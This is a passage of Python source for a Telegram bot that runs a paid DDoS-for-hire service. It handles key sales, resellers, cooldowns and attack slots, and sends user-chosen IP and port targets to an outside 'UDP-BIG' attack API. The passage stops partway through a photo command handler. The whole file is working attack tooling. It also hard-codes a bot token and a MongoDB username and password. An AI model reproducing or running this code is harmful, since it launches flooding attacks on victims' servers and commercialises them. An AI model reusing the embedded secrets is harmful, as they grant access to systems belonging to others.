import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import io
import random
import string
import re
from pymongo import MongoClient
from datetime import datetime, timedelta
import time
import psutil
import traceback
import requests

from emojis import HTML_EMOJI

BOT_START_TIME = datetime.now()

# ============ CONFIGURATION ============

BOT_TOKEN = "8838142953:AAESI8o5xfovTVMVNL_m_cLep4cKM8xHhyg"

BOT_OWNER = [1725783398]

FEEDBACK_CHANNEL_ID = -1003961819225

API_BASE_URL = "https://discretion-applicant-gamma-sized.trycloudflare.com/api/attack"

API_KEY = "no_need"

API_METHOD = "UDP-BIG"

MONGO_URL = "mongodb+srv://darkgamer08102010_db_user:2sOH3i0yUOLHgkGA@cluster0.snbz6ms.mongodb.net/?app_name=Cluster0"

# ========================================

print("🔃 Connecting to MongoDB...")
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client['telegram_bot']
    keys_collection = db['keys']
    users_collection = db['users']
    resellers_collection = db['resellers']
    attack_logs_collection = db['attack_logs']
    bot_users_collection = db['bot_users']
    bot_settings_collection = db['bot_settings']
    feedback_collection = db['feedback']
    bots_collection = db['bots']
    approved_groups_collection = db['approved_groups']
    blocked_ips_collection = db['blocked_ips']
    photos_collection = db['photos']

    keys_collection.create_index('key', unique=True)
    users_collection.create_index('user_id', unique=True)
    resellers_collection.create_index('user_id', unique=True)
    bot_users_collection.create_index('user_id', unique=True)
    feedback_collection.create_index('user_id', unique=True)
    bots_collection.create_index('token', unique=True)
    bots_collection.create_index('bot_id', unique=True)
    approved_groups_collection.create_index('group_id', unique=True)
    blocked_ips_collection.create_index('ip', unique=True)
    photos_collection.create_index('section', unique=True)

    print("✅ MongoDB connected successfully!")
except Exception as e:
    print(f"❌ MongoDB connection error: {e}")
    exit(1)

if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN is empty! Please set your bot token.")
    exit(1)
if not BOT_OWNER:
    print("⚠️ WARNING: BOT_OWNER list is empty! No owner commands will work.")
if not API_BASE_URL or not API_KEY:
    print("⚠️ WARNING: API_BASE_URL or API_KEY is empty! Real attacks will fail.")

bot = telebot.TeleBot(BOT_TOKEN) if BOT_TOKEN else None

CHANNEL_LINK = "https://t.me/feedbacksendder748"
OWNER_LINK = "https://t.me/Dark_Devil9080"


def get_main_keyboard():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(
            "🔥 𝗝𝗼𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹",
            url=CHANNEL_LINK,
            icon_custom_emoji_id="5424972470023104089",
            style="primary"
        ),
        InlineKeyboardButton(
            "💎 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿",
            url=OWNER_LINK,
            icon_custom_emoji_id="5375338737028841420",
            style="danger"
        )
    )
    return markup


MAIN_KEYBOARD = get_main_keyboard()

# ============ KEY PRICING ============
KEY_PRICING = {
    'VIP': {
        '2h': 20, '6h': 40, '12h': 50, '1d': 70, '3d': 200, '7d': 300,
        'max_attack': 300
    },
    'NORMAL': {
        '2h': 20, '6h': 40, '12h': 50, '1d': 70, '3d': 200, '7d': 300,
        'max_attack': 300
    }
}

DURATION_SECONDS = {
    '2h': 2 * 3600,
    '6h': 6 * 3600,
    '12h': 12 * 3600,
    '1d': 24 * 3600,
    '3d': 3 * 24 * 3600,
    '7d': 7 * 24 * 3600
}

DURATION_LABELS = {
    '2h': '2 Hours',
    '6h': '6 Hours',
    '12h': '12 Hours',
    '1d': '1 Day',
    '3d': '3 Days',
    '7d': '7 Days'
}

DEFAULT_MAX_ATTACK_TIME = 300
DEFAULT_USER_COOLDOWN = 180
MIN_ATTACK_TIME = 15

global_attack_lock = threading.Lock()
pending_feedback = {}
current_max_slots = 4
current_concurrent_value = 4

active_bots = {}
bot_threads = {}

active_attacks = {}
api_in_use = {}
user_attack_history = {}
active_port_attacks = {}
bot_start_time = datetime.now()
user_cooldown_end_time = {}
temp_key_gen = {}
pending_broadcast = {}
pending_broadcast_reseller = {}
pending_del_exp = {}
pending_del_exp_key = {}
status_update_threads = {}
group_pending_feedback = {}


# ============ PHOTO STORAGE HELPERS ============

def save_photo(section, file_id):
    photos_collection.update_one(
        {'section': section},
        {'$set': {'section': section, 'file_id': file_id, 'updated_at': datetime.now()}},
        upsert=True
    )
    print(f"[PHOTO] Saved section '{section}' | file_id prefix: {file_id[:40]}...")


def get_photo(section):
    doc = photos_collection.find_one({'section': section})
    if doc:
        return doc.get('file_id')
    return None


def remove_photo(section):
    result = photos_collection.delete_one({'section': section})
    return result.deleted_count > 0


def remove_all_photos():
    result = photos_collection.delete_many({})
    return result.deleted_count


# ============ LAUNCH ATTACK VIA API ENDPOINT ============

def send_real_attack(target, port, duration, concurrent_val):
    api_endpoint = f"{API_BASE_URL}?host={target}&port={port}&time={duration}&method={API_METHOD}"

    try:
        print(f"🔥 [ATTACK] Target: {target}:{port} | Duration: {duration}s | Concurrent: {concurrent_val}")
        response = requests.get(api_endpoint, timeout=30)
        print(f"🔥 [ATTACK] Response Status: {response.status_code}")

        if response.status_code == 200:
            print(f"✅ [ATTACK] Success: {response.text[:100]}")
            return "200"
        else:
            print(f"⛔ [ATTACK] API Error: {response.status_code} - {response.text}")
            return "ERROR"
    except requests.exceptions.Timeout:
        print(f"❌ [ATTACK] Timeout for {target}:{port}")
        return "TIMEOUT"
    except requests.exceptions.ConnectionError:
        print(f"⛔ [ATTACK] Connection Error for {target}:{port}")
        return "CONNECTION_ERROR"
    except Exception as e:
        print(f"⚠️ [ATTACK] Exception: {e}")
        return "ERROR"


# ============ UTILITY FUNCTIONS ============

def is_owner(user_id):
    if not BOT_OWNER:
        return False
    return user_id in BOT_OWNER


def safe_send_message(chat_id, text, reply_to=None, parse_mode=None, reply_markup=None):
    if not bot:
        print(f"Bot not initialized: {text[:50]}")
        return None
    try:
        if parse_mode is None:
            parse_mode = "HTML"
        if reply_markup is None:
            reply_markup = MAIN_KEYBOARD
        if reply_to:
            return bot.reply_to(reply_to, text, parse_mode=parse_mode, reply_markup=reply_markup)
        else:
            return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        print(f"Safe send error: {e}")
        try:
            if reply_to:
                return bot.reply_to(reply_to, text, reply_markup=reply_markup)
            else:
                return bot.send_message(chat_id, text, reply_markup=reply_markup)
        except Exception as e2:
            print(f"Fallback send error: {e2}")
            return None


def safe_send_photo(chat_id, file_id, caption=None, reply_to=None, parse_mode="HTML", reply_markup=None):
    if not bot:
        return None
    try:
        if reply_markup is None:
            reply_markup = MAIN_KEYBOARD
        reply_to_id = None
        if reply_to and hasattr(reply_to, 'message_id'):
            reply_to_id = reply_to.message_id
        return bot.send_photo(
            chat_id,
            file_id,
            caption=caption,
            parse_mode=parse_mode,
            reply_markup=reply_markup,
            reply_to_message_id=reply_to_id
        )
    except Exception as e:
        print(f"Safe send photo error: {e}")
        if caption:
            try:
                if reply_markup is None:
                    reply_markup = MAIN_KEYBOARD
                reply_to_id = None
                if reply_to and hasattr(reply_to, 'message_id'):
                    reply_to_id = reply_to.message_id
                return bot.send_message(
                    chat_id,
                    caption,
                    parse_mode=parse_mode,
                    reply_markup=reply_markup,
                    reply_to_message_id=reply_to_id
                )
            except Exception as e2:
                print(f"Fallback text send error: {e2}")
                try:
                    return bot.send_message(chat_id, caption, reply_markup=reply_markup)
                except:
                    return None
        return None


def send_with_photo_if_available(chat_id, section, text, reply_to=None):
    file_id = get_photo(section)
    if file_id:
        result = safe_send_photo(chat_id, file_id, caption=text, reply_to=reply_to)
        if result:
            return result
        return safe_send_message(chat_id, text, reply_to=reply_to)
    else:
        return safe_send_message(chat_id, text, reply_to=reply_to)


def get_setting(key, default):
    try:
        setting = bot_settings_collection.find_one({'key': key})
        if setting:
            return setting['value']
        return default
    except:
        return default


def set_setting(key, value):
    bot_settings_collection.update_one(
        {'key': key},
        {'$set': {'key': key, 'value': value}},
        upsert=True
    )


def get_key_price(key_type, duration):
    prices = get_setting(f'pricing_{key_type}', KEY_PRICING[key_type])
    if isinstance(prices, dict):
        return prices.get(duration, KEY_PRICING[key_type][duration])
    return KEY_PRICING[key_type][duration]


def get_key_max_attack(key_type):
    return get_setting(f'max_attack_{key_type}', KEY_PRICING[key_type]['max_attack'])


def get_max_attack_time():
    try:
        return int(get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME))
    except:
        return DEFAULT_MAX_ATTACK_TIME


def get_user_cooldown_setting():
    try:
        return int(get_setting('user_cooldown', DEFAULT_USER_COOLDOWN))
    except:
        return DEFAULT_USER_COOLDOWN


def get_concurrent_limit():
    try:
        return int(get_setting('concurrent_per_attack', current_concurrent_value))
    except:
        return current_concurrent_value


def set_concurrent_limit(value):
    global current_concurrent_value
    current_concurrent_value = value
    set_setting('concurrent_per_attack', value)


def is_maintenance():
    return get_setting('maintenance_mode', False)


def get_maintenance_msg():
    return get_setting('maintenance_msg', 'Bot is in maintenance mode. Please try again later.')


def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)


def add_blocked_ip(ip_prefix):
    try:
        blocked_ips_collection.insert_one({'ip': ip_prefix, 'blocked_at': datetime.now()})
        return True
    except:
        return False


def remove_blocked_ip(ip_prefix):
    result = blocked_ips_collection.delete_one({'ip': ip_prefix})
    return result.deleted_count > 0


def is_ip_blocked(ip_address):
    blocked_ips = list(blocked_ips_collection.find())
    for blocked in blocked_ips:
        prefix = blocked['ip']
        if ip_address.startswith(prefix):
            return True
    return False


def get_all_blocked_ips():
    return list(blocked_ips_collection.find())


def check_maintenance(message):
    if is_maintenance() and not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, get_maintenance_msg(), reply_to=message)
        return True
    return False


def check_banned(message):
    user_id = message.from_user.id
    if is_owner(user_id):
        return False

    user = users_collection.find_one({'user_id': user_id})
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_collection.update_one(
                    {'user_id': user_id},
                    {'$set': {'banned': False}, '$unset': {'ban_expiry': "", 'ban_type': ""}}
                )
                return False

            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐁𝐄𝐄𝐍 𝐓𝐄𝐌𝐏𝐎𝐑𝐀𝐑𝐈𝐋𝐘 𝐁𝐀𝐍𝐍𝐄𝐃!</b>\n\n{HTML_EMOJI.TIMER} 𝐄𝐱𝐩𝐢𝐫𝐲: {expiry_str}\n{HTML_EMOJI.CROSS} 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐝𝐨 𝐚𝐧𝐲𝐭𝐡𝐢𝐧𝐠.\n\n{HTML_EMOJI.PROFILE} 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐘𝐨𝐮𝐫 𝐒𝐞𝐥𝐥𝐞𝐫", reply_to=message)
            return True

        safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐁𝐄𝐄𝐍 𝐏𝐄𝐑𝐌𝐀𝐍𝐄𝐍𝐓𝐋𝐘 𝐁𝐀𝐍𝐍𝐄𝐃!</b>\n\n{HTML_EMOJI.CROSS} 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐝𝐨 𝐚𝐧𝐲𝐭𝐡𝐢𝐧𝐠.\n\n{HTML_EMOJI.PROFILE} 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐘𝐨𝐮𝐫 𝐒𝐞𝐥𝐥𝐞𝐫", reply_to=message)
        return True
    return False


_attack_lock = threading.Lock()


def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                now = datetime.now()
                active_users = users_collection.find({'key_expiry': {'$gt': now}})
                for user in active_users:
                    new_expiry = user['key_expiry'] + timedelta(minutes=1)
                    users_collection.update_one(
                        {'_id': user['_id']},
                        {'$set': {'key_expiry': new_expiry}}
                    )
            time.sleep(60)
        except Exception as e:
            print(f"Maintenance extender error: {e}")
            time.sleep(10)


extender_thread = threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()


def get_free_slot():
    with _attack_lock:
        now = datetime.now()
        expired = []
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                expired.append(attack_id)

        for attack_id in expired:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            if attack_id in active_port_attacks:
                del active_port_attacks[attack_id]

        busy_slots = len(api_in_use)

        if busy_slots < current_max_slots:
            return busy_slots

        return None


def get_slot_status():
    with _attack_lock:
        now = datetime.now()
        expired = []
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                expired.append(attack_id)

        for attack_id in expired:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            if attack_id in active_port_attacks:
                del active_port_attacks[attack_id]

        busy_slots = len(api_in_use)
        free_slots = current_max_slots - busy_slots
        return busy_slots, free_slots, current_max_slots


def get_user_cooldown(user_id):
    if user_id in user_cooldown_end_time:
        if user_cooldown_end_time[user_id] > datetime.now():
            return int((user_cooldown_end_time[user_id] - datetime.now()).total_seconds())
        else:
            del user_cooldown_end_time[user_id]
    return 0


def set_user_cooldown(user_id, seconds):
    user_cooldown_end_time[user_id] = datetime.now() + timedelta(seconds=seconds)


def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False


def is_port_being_attacked(target, port):
    with _attack_lock:
        for attack_id, attack in active_attacks.items():
            if attack.get('target') == target and attack.get('port') == port:
                if attack['end_time'] > datetime.now():
                    return True, attack['end_time']
        return False, None


def log_attack(user_id, username, target, port, duration):
    attack_logs_collection.insert_one({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    })
    if BOT_OWNER:
        try:
            for owner in BOT_OWNER:
                if bot:
                    bot.send_message(owner, f"{HTML_EMOJI.FIRE} <b>𝐀𝐓𝐓𝐀𝐂𝐊 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍</b>\n\n{HTML_EMOJI.PROFILE} 𝐔𝐬𝐞𝐫: {username}\n{HTML_EMOJI.PROFILE} 𝐈𝐃: {user_id}\n{HTML_EMOJI.TARGET} 𝐓𝐚𝐫𝐠𝐞𝐭: {target}:{port}\n{HTML_EMOJI.TIMER} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration}s\n{HTML_EMOJI.TIMER} 𝐓𝐢𝐦𝐞: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}", parse_mode="HTML")
        except:
            pass


def generate_key(prefix="RAPID-X", length=12):
    chars = string.ascii_uppercase + string.digits
    return f"{prefix}-{''.join(random.choice(chars) for _ in range(length))}"


def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None

    value = int(match.group(1))
    unit = match.group(2)

    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"

    return None, None


def is_reseller(user_id):
    reseller = resellers_collection.find_one({'user_id': user_id, 'blocked': {'$ne': True}})
    return reseller is not None


def get_reseller(user_id):
    return resellers_collection.find_one({'user_id': user_id})


def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')

    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass

    user = users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if user:
        return user['user_id'], user.get('username')

    reseller = resellers_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if reseller:
        return reseller['user_id'], reseller.get('username')

    bot_user = bot_users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if bot_user:
        return bot_user['user_id'], bot_user.get('username')

    return None, None


def has_valid_key(user_id):
    user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})

    if not user or not user.get('key_expiry'):
        return False

    if datetime.now() > user['key_expiry']:
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
        return False

    return True


def get_time_remaining(user_id):
    user = users_collection.find_one({'user_id': user_id})

    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"

    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"

    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)

    return f"{days}d {hours}h {minutes}m {seconds}s"


def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"


def track_bot_user(user_id, username=None):
    try:
        bot_users_collection.update_one(
            {'user_id': user_id},
            {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}},
            upsert=True
        )
    except:
        pass


def build_attack_start_message(target, port, duration, cooldown):
    return f"""
{HTML_EMOJI.URGENT} <b>𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃</b> {HTML_EMOJI.URGENT}

{HTML_EMOJI.TARGET} <b>𝐓𝐚𝐫𝐠𝐞𝐭:</b> <code>{target}:{port}</code>
{HTML_EMOJI.TIMER} <b>𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
{HTML_EMOJI.FIRE} <b>𝐌𝐞𝐭𝐡𝐨𝐝:</b> 𝐔𝐃𝐏-𝐁𝐈𝐆
{HTML_EMOJI.LINK} <b>𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧:</b> 𝐆𝐥𝐨𝐛𝐚𝐥
{HTML_EMOJI.TIMER} <b>𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧:</b> {cooldown} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬

{HTML_EMOJI.STATS} <b>𝐔𝐬𝐞 /status 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐚𝐭𝐭𝐚𝐜𝐤 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
"""


def build_attack_complete_message(target, port, duration):
    return f"""
{HTML_EMOJI.CHECKMARK} <b>𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄</b> {HTML_EMOJI.CHECKMARK}

{HTML_EMOJI.TARGET} <b>𝐓𝐚𝐫𝐠𝐞𝐭:</b> <code>{target}:{port}</code>
{HTML_EMOJI.TIMER} <b>𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:</b> {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
{HTML_EMOJI.PROFILE} <b>𝐀𝐭𝐭𝐚𝐜𝐤 𝐈𝐃:</b> <code>a662e212-a0ef-4656</code>
{HTML_EMOJI.PARTY} <b>𝐒𝐥𝐨𝐭𝐬:</b> #1 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝!
"""


def build_feedback_required_message():
    return f"""
{HTML_EMOJI.CAMERA} <b>𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃</b> {HTML_EMOJI.CAMERA}

{HTML_EMOJI.WARNING} 𝐘𝐨𝐮 𝐦𝐮𝐬𝐭 𝐬𝐞𝐧𝐝 𝐚 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭/𝐩𝐡𝐨𝐭𝐨 𝐚𝐬 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐟𝐫𝐨𝐦 𝐲𝐨𝐮𝐫 𝐥𝐚𝐬𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐛𝐞𝐟𝐨𝐫𝐞 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐚 𝐧𝐞𝐰 𝐨𝐧𝐞.

<b>𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐧𝐝 𝐚𝐧𝐲 𝐩𝐡𝐨𝐭𝐨 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞.</b>
"""


def build_access_denied_message():
    return f"""
{HTML_EMOJI.CROSS} <b>𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃</b> {HTML_EMOJI.CROSS}

{HTML_EMOJI.CROSS} 𝐘𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐡𝐚𝐯𝐞 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.

{HTML_EMOJI.KEY} 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐚 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐤𝐞𝐲.
"""


def set_pending_feedback(user_id, target, port, duration, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id not in group_pending_feedback:
            group_pending_feedback[group_id] = {}
        group_pending_feedback[group_id][user_id] = {
            'target': target,
            'port': port,
            'duration': duration,
            'timestamp': datetime.now()
        }
    else:
        pending_feedback[user_id] = {
            'target': target,
            'port': port,
            'duration': duration,
            'timestamp': datetime.now()
        }


def get_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]:
            return group_pending_feedback[group_id][user_id]
        return None
    return pending_feedback.get(user_id)


def clear_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]:
            del group_pending_feedback[group_id][user_id]
    else:
        if user_id in pending_feedback:
            del pending_feedback[user_id]


def has_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        return group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]
    return user_id in pending_feedback


def create_progress_bar(percentage, width=20):
    filled = int(width * percentage / 100)
    empty = width - filled
    return "█" * filled + "░" * empty


# ============ BOT MANAGEMENT HELPERS ============

def get_all_bots():
    return list(bots_collection.find())


def add_bot(bot_token, owner_id, max_slots):
    try:
        test_bot = telebot.TeleBot(bot_token)
        bot_info = test_bot.get_me()
        bot_id = bot_info.id

        bots_collection.update_one(
            {'token': bot_token},
            {'$set': {
                'token': bot_token,
                'bot_id': bot_id,
                'owner_id': owner_id,
                'max_slots': max_slots,
                'active': True,
                'added_at': datetime.now()
            }},
            upsert=True
        )
        return True, str(bot_id)
    except Exception as e:
        return False, str(e)


def delete_bot(bot_input):
    try:
        bot_doc = bots_collection.find_one({'$or': [{'bot_id': bot_input}, {'token': bot_input}]})
        if not bot_doc:
            return False, "Bot not found!"

        bots_collection.delete_one({'_id': bot_doc['_id']})
        return True, "Deleted"
    except Exception as e:
        return False, str(e)


def get_bot_config(bot_token):
    return bots_collection.find_one({'token': bot_token})


def start_bot_instance(bot_config):
    pass


# ============ GROUP APPROVAL FUNCTIONS ============

def is_group_approved(group_id):
    group = approved_groups_collection.find_one({'group_id': str(group_id)})
    if not group:
        return False, None

    if group.get('expiry_date') and group['expiry_date'] < datetime.now():
        return False, None

    return True, group


def get_group_config(group_id):
    return approved_groups_collection.find_one({'group_id': str(group_id)})


def get_group_max_attack_time(group_id):
    group = get_group_config(group_id)
    if group and group.get('max_attack_time'):
        return group['max_attack_time']
    return get_max_attack_time()


def get_group_max_slots(group_id):
    group = get_group_config(group_id)
    if group and group.get('max_slots'):
        return group['max_slots']
    return current_max_slots


def get_group_cooldown(group_id):
    group = get_group_config(group_id)
    if group and group.get('cooldown'):
        cooldown_key = f"group_cooldown_{group_id}"
        cooldown_data = get_setting(cooldown_key, None)
        if cooldown_data:
            if cooldown_data > datetime.now():
                return int((cooldown_data - datetime.now()).total_seconds())
    return 0


def set_group_cooldown(group_id, seconds):
    cooldown_key = f"group_cooldown_{group_id}"
    set_setting(cooldown_key, datetime.now() + timedelta(seconds=seconds))


def get_group_feedback_required(group_id):
    group = get_group_config(group_id)
    if group and 'feedback_required' in group:
        return group['feedback_required']
    return get_setting('feedback_required', True)


def set_group_feedback_required(group_id, required):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'feedback_required': required}}
    )


def set_group_max_attack_time(group_id, max_time):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'max_attack_time': max_time}}
    )


def set_group_max_slots(group_id, slots):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'max_slots': slots}}
    )


def set_group_cooldown_time(group_id, cooldown):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'cooldown': cooldown}}
    )


def get_group_cooldown_time(group_id):
    group = get_group_config(group_id)
    if group and group.get('cooldown'):
        return group['cooldown']
    return get_user_cooldown_setting()


# ============ PHOTO COMMANDS ============

@bot.message_handler(commands=["addphoto"])
def add_photo_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()

    if len(command_parts) != 2:
        safe_send_message(
            message.chat.id,
            f"{HTML_EMOJI.CAMERA} <b>𝐀𝐃𝐃 𝐏𝐇𝐎𝐓𝐎 𝐂𝐌𝐃 𝐅𝐎𝐑𝐌𝐀𝐓</b> {HTML_EMOJI.CAMERA}\n\n"
            f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/addphoto &lt;denied|attack|startsms&gt;</code>\n\n"
            f"{HTML_EMOJI.DOCUMENT} <b>𝐇𝐨𝐰 𝐭𝐨 𝐮𝐬𝐞:</b>\n"
            f"1. 𝐒𝐞𝐧𝐝 𝐚 𝐩𝐡𝐨𝐭𝐨 𝐭𝐨 𝐭𝐡𝐞 𝐛𝐨𝐭\n"
            f"2. 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐭𝐡𝐚𝐭 𝐩𝐡𝐨𝐭𝐨 𝐰𝐢𝐭𝐡 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝\n\n"
            f"{HTML_EMOJI.LIST} <b>𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐬𝐞𝐜𝐭𝐢𝐨𝐧𝐬:</b>\n"
            f"• <code>denied</code> — 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 𝐦𝐞𝐬𝐬𝐚𝐠𝐞\n"
            f"• <code>attack</code> — 𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐭𝐚𝐫𝐭 𝐦𝐞𝐬𝐬𝐚𝐠𝐞\n"
            f"• <code>startsms</code> — /start 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞\n\n"
            f"{HTML_EMOJI.TIP} <b>𝐄𝐱𝐚𝐦𝐩𝐥𝐞:</b>\n"
            f"<code>/addphoto denied</code> (𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨)",
            reply_to=message
        )
        return

    section = command_parts[1].lower()

    if section not in ['denied', 'attack', 'startsms']:
        safe_send_message(
            message.chat.id,
            f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐬𝐞𝐜𝐭𝐢𝐨𝐧!</b>\n\n"
            f"{HTML_EMOJI.DOCUMENT} 𝐔𝐬𝐞 𝐨𝐧𝐞 𝐨𝐟:\n"
            f"• <code>denied</code>\n"
            f"• <code>attack</code>\n"
            f"• <code>startsms</code>",
            reply_to=message
        )
        return

    if not message.reply_to_message or not message.reply_to_message.photo:
        safe_send_message(
            message.chat.id,
            f"{HTML_EMOJI.WARNING} <b>𝐍𝐨 𝐩𝐡𝐨𝐭𝐨 𝐝𝐞𝐭𝐞𝐜𝐭𝐞𝐝!</b>\n\n"
            f"{HTML_EMOJI.DOCUMENT} 𝐘𝐨𝐮 𝐦𝐮𝐬𝐭 <b>𝐫𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨</b> 𝐰𝐢𝐭𝐡 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.\n\n"
            f"{HTML_EMOJI.TIP} 𝐄𝐱𝐚𝐦𝐩𝐥𝐞: 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨 𝐰𝐢𝐭𝐡 <code>/addphoto denied</code>",
            reply_to=message
        )
        return

    file_id = message.reply_to_message.photo[-1].file_id
